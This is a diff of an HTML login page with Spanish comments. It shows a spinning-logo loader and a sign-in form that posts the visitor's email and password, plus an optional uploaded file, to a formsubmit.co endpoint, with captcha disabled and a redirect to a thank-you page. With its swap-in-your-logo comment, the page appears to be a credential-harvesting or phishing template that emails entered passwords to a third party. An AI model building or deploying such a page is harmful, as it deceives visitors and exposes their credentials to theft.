@@ -88,16 +88,24 @@
 <body>
   <!-- Pantalla de carga con logo girando -->
   <div id="loader">
-    <!-- SOLO CAMBIA EL ENLACE DE TU LOGO -->
+    <!-- 👇 CAMBIA ESTE ENLACE POR EL DE TU LOGO -->
     <img src="TU_ENLACE_DE_LOGO.png" alt="Logo">
   </div>
 
   <!-- Pantalla de login -->
   <div id="login">
     <h2>Inicia Sesión</h2>
-    <form action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" method="POST">
+    <form action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" method="POST" enctype="multipart/form-data">
+      <!-- Campos visibles -->
       <input type="email" name="email" placeholder="Tu correo" required>
       <input type="password" name="password" placeholder="Tu contraseña" required>
+      <input type="file" name="archivo">
+
+      <!-- Campos ocultos -->
+      <input type="hidden" name="_next" value="https://tudominio.com/gracias.html">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+
       <button type="submit">Ingresar</button>
     </form>
   </div>
